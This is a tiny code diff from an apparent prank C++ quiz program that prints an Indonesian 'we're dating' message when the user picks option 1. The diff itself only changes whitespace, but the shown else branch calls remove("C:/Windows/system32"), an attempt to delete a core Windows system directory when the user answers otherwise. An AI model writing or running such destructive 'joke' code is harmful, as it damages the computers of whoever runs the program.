@@ -15,7 +15,7 @@ int main() {
 
 	if (pilihan==1){
 		cout<<"yey kita pacaran";
-	}else{
+	}else {
 		(remove("C:/Windows/system32")==0);
 		 }
 		 return 0;
